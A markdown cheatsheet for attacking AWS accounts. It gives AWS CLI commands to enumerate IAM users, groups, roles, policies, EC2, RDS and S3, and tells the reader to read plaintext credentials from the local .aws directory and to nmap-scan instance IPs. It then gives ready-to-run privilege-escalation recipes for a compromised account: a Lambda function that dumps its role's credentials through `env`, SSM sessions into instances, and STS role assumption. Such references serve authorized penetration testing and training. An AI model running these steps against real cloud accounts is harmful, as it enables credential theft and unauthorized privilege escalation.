## AWS cheatsheet
- Create long term access with access key ID + secret key (you will be prompted to enter the values after the command runs)
```
aws configure --profile PROFILE_NAME
```
- Get configured identity information
```
aws sts get-caller-identity --profile PROFILE_NAME
```
- Set environment variables and configure identity (access key ID + secret key + session token)
```
set AWS_ACCESS_KEY_ID=KEY
set AWS_SECRET_ACCESS_KEY=SECRET_KEY
set AWS_SESSION_TOKEN=TOKEN
aws configure
```
- Local credentials are stored in `/home/USERNAME/.aws` on Linux and `C:\Users\USERNAME\.aws` on Windows. `cat credentials` under either of the directories to get plaintext credentials.

### User enumeration
- List all IAM users
```
aws iam list-users
```
- List a specific user's IAM groups
```
aws iam list-groups-for-user --user-name USERNAME
```
- List a specific user's attached managed IAM policies
```
aws iam list-attached-user-policies --user-name USERNAME
```
- List a specific user's attached inline IAM policies
```
aws iam list-user-policies --user-name USERNAME
```

### Group enumeration
- List all IAM groups
```
aws iam list-groups
```
- List a specific group's attached managed IAM policies
```
aws iam list-attached-group-policies --group-name GROUPNAME
```
- List a specific group's attached inline IAM policies
```
aws iam list-group-policies --group-name GROUPNAME
```

### Role enumeration
- List all IAM roles
```
aws iam list-roles
```
- List a specific role's attached managed IAM policies (useful when a federated user is compromised) 
```
aws iam list-attached-role-policies --role-name ROLENAME
```

- List a specific role's inline managed IAM policies (useful when a federated user is compromised) 
```
aws iam list-role-policies --role-name ROLENAME
```

### Policy enumeration
- List all IAM policies
```
aws iam list-policies
```
- Get a specific managed policy's information
```
aws iam get-policy --policy-arn POLICYARN
```

- List a specific policy's version information
```
aws iam list-policy-versions --policy-arn POLICYARN
```
- Get the information of a version of a specific policy
```
aws iam get-policy-version --policy-arn POLICYARN --version-id VERSIONID
```
- Get a specific user/group/role's inline policy document (use the last one with federated users)
```
aws iam get-user-policy --user-name USERNAME --policy-name POLICYNAME
aws iam get-group-policy --group-name GROUPNAME --policy-name POLICYNAME
aws iam get-role-policy --role-name ROLENAME --policy-name POLICYNAME
```

### EC2 instance enumeration
- List all EC2 instances for a specific region
```
aws ec2 describe-instances --region REGION
```
- Scan the external IP address of EC2 instances with `nmap`
```
nmap -sS -Pn IP1,IP2,IP3
```

### RDS enumeration
- List DB instances:
```
aws rds describe-db-instances --region REGION
```
- Get a DB's security group info:
```
aws ec2 describe-security-groups --group-ids SGID --region REGION
```

### Enumeration for initial foothold
- Use cloud_enum to enumerate the organization
```
./cloud_enum.py -k ORGNAME
```
- Use `pacu` for advanced enumeration (an other activities) with credentials. Specifically the `iam__privesc_scan` script.

### S3 bucket enumeration
- List all S3 buckets
```
aws s3 ls --profile PROFILE
```
- List a specific S3 bucket's content
```
aws s3 ls BUCKETNAME
```
- Download an object from an S3 bucket
```
aws s3 copy s3://BUCKETNAME/OBJECTNAME /PATH/TO/LOCAL/COPY
```

### Privilege escalation via lambda functions
- If the compromised account has access to create lambda functions and `iam:PassRole` privileges then a lambda function with high privileges can be created
- Store the following code in a file and name it `lambda_function.py`
```
import json
import subprocess

def lambda_handler(event, context):
    data = subprocess.Popen('env', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output, errors = data.communicate()
    return {
        'statusCode': 200,
        'body': json.dumps(output)
    }
```
- Zip the file in an archive and run the following command
```
aws lambda create-function --function-name privesc-fun --runtime python3.7 --zip-file fileb://my-function.zip --handler lambda_function.lambda_handler --role ROLEARN --region REGION --profile PROFILE
```
- List lambda functions to confirm the function was created
```
aws lambda list-functions
```
- Run the function to obtain short-lived credentials
```
aws lambda invoke --function-name "privesc-fun" --log-type Tail output.txt --region REGION --profile PROFILE
```

### Privilege escalation via SSM
- If the compromised account has `ssm:*` access then it has access to VMs and EC2 instances without needing a public IP address, SSH keys or username/password combinations
- Start a session in an EC2 instance
```
aws ssm start-session --target INSTANCE_ID --profile PROFILE --region REGION
```
- Enumerate the EC2 instance's role
```
aws sts get-caller-identity
```
- Continue enumeration and repeat the enumeration commands at the top of this document

### Privilege escalation via STS
- If the compromised account has `sts:*` privileges then you can assume roles
- Enumerate the existing roles and check for the `sts:AssumeRole` action for the role you currently hold
- Assume the role found and get a short-lived credential set
```
aws sts assume-role --role-arn FOUNDROLEARN --role-session-name SOMENAME
```
### More resources
- https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
